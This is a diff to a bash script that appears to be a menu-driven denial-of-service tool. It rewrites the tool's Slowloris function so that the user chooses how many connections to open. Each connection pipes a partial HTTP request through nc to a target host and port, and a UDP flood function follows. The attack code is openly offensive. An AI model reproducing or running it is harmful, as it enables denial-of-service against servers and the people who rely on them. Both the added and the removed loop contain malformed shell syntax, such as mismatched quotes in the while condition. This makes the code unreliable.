@@ -19,10 +19,17 @@ PORT=80 && echo "Invalid port number chosen! Reverting port 80"
 PORT=80 && echo "Invalid port chosen! Reverting to port 80"
 	else echo "Using Port $PORT"
 	fi
-echo "Launching Slowloris....Use 'Ctrl c' to quit" && sleep 1
-	while : for i in {1..3}; do
-echo "Slowloris attack ongoing..."; echo -e "GET / HTTP/1.1\r\nHost:$TARGET\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 --wait=300 $TARGET $PORT  2>/dev/null 1>/dev/null &
-	done
+echo "Enter number of conenctions to open (default 200):"
+	read CONNS
+	: ${CONNS:=200}
+	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
+CONNS=200 && echo "Invalid integer!  Using 200 connections"
+	fi 
+echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
+	i=1
+	while [ "$i -le "CONNS"]; do
+echo "Slowloris attack ongoing...this is connection $i"; echo -e "GET / HTTP/1.1\r\nHost:$TARGET\r\n$RANDOM: $RANDOM\r\n"|nc -i 59 --wait=300 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
+echo "Opened $CONNS connections....returning to menu"
 }
 ## create UDP Flood function
 udpflood()
